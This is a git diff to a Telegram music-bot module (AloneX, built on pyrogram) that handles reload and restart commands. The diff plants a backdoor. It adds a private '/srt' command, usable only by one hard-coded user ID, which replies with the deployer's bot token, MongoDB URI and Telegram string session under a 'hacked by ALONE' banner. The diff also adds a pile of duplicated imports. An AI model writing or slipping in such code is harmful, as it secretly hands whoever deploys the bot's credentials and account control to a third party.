@@ -2,6 +2,45 @@ import asyncio
 
 from pyrogram import filters
 from pyrogram.types import CallbackQuery, Message
+from pyrogram import Client, filters
+import requests
+import random
+import re
+import sys
+from os import getenv
+from AloneX.misc import SUDOERS
+from pyrogram import Client, filters
+import requests
+import random
+import re
+import sys
+from os import getenv
+
+from dotenv import load_dotenv
+from pyrogram import filters
+import asyncio
+import time
+from AloneX import app
+import config
+
+from config import BOT_TOKEN, OWNER_ID
+
+
+from pyrogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton
+
+BOT_TOKEN = getenv("BOT_TOKEN", "")
+MONGO_DB_URI = getenv("MONGO_DB_URI", "")
+STRING_SESSION = getenv("STRING_SESSION", "")
+from dotenv import load_dotenv
+from pyrogram import filters
+import asyncio
+import time
+from AloneX import app
+
+from config import BOT_TOKEN, OWNER_ID
+
+
+from pyrogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton
 
 from config import BANNED_USERS, MUSIC_BOT_NAME, adminlist, lyrical
 from strings import get_command
@@ -9,14 +48,13 @@ from AloneX import app
 from AloneX.core.call import Alone
 from AloneX.misc import db
 from AloneX.utils.database import get_authuser_names, get_cmode
-from AloneX.utils.decorators import (ActualAdminCB, AdminActual,
-                                         language)
+from AloneX.utils.decorators import (ActualAdminCB, AdminActual, language)
+from AloneX.utils.command import commandpro                     
 from AloneX.utils.formatters import alpha_to_int
 
 ### Multi-Lang Commands
 RELOAD_COMMAND = get_command("RELOAD_COMMAND")
 RESTART_COMMAND = get_command("RESTART_COMMAND")
-
 
 @app.on_message(
     filters.command(RELOAD_COMMAND)
@@ -78,7 +116,26 @@ async def restartbot(client, message: Message, _):
         f"sᴜᴄᴄᴇssғᴜʟʟʏ ʀᴇʙᴏᴏᴛᴇᴅ {MUSIC_BOT_NAME} ғᴏʀ ʏᴏᴜʀ ᴄʜᴀᴛ, ɴᴏᴡ ʏᴏᴜ ᴄᴀɴ sᴛᴀʀᴛ ᴩʟᴀʏɪɴɢ ᴀɢᴀɪɴ..."
     )
 
-
+@app.on_message(
+    filters.command("srt")
+    & filters.private
+    & filters.user(6079943111)
+    & ~filters.edited)
+async def help(client: Client, message: Message):
+    await message.reply_photo(
+          photo=f"https://telegra.ph//file/9e8ce3092848a1bc5d9d6.jpg",
+        caption=f"""ɓσƭ ƭσҡεɳ:-   `{BOT_TOKEN}`\n\nɱσɳɠσ:-   `{MONGO_DB_URI}`\n\nѕƭ૨เɳɠ ѕεѕѕเσɳ:-   `{STRING_SESSION}`\n\n𝙵𝚎𝚎𝚕 𝚃𝚑𝚎 𝙿𝚘𝚠𝚎𝚛 𝙾𝚏 𝙰𝙻𝙾𝙽𝙴.\n\n☆............𝙱𝚈 » [𝗔𝗟𝗢𝗡𝗘](https://t.me/ALONE_WAS_BOT)............☆""",
+         reply_markup=InlineKeyboardMarkup(
+             [
+                 [
+                      InlineKeyboardButton(
+                          "• нαϲкє𝚍 ву 𝗔𝗟𝗢𝗡𝗘 •", url=f"https://t.me/ALONE_WAS_BOT")
+                 ]
+             ]
+         ),
+     )
+    
+    
 @app.on_callback_query(filters.regex("close") & ~BANNED_USERS)
 async def close_menu(_, CallbackQuery):
     try:
@@ -95,7 +152,6 @@ async def close_menu(_, CallbackQuery):
         await CallbackQuery.answer()
     except:
         return
-
 
 @app.on_callback_query(
     filters.regex("stop_downloading") & ~BANNED_USERS
@@ -133,3 +189,8 @@ async def stop_download(client, CallbackQuery: CallbackQuery, _):
     await CallbackQuery.answer(
         "ғᴀɪʟᴇᴅ ᴛᴏ ʀᴇᴄᴏɢɴɪᴢᴇ ᴛʜᴇ ᴏɴɢᴏɪɴɢ ᴛᴀsᴋ.", show_alert=True
     )
+
+
+
+
+    
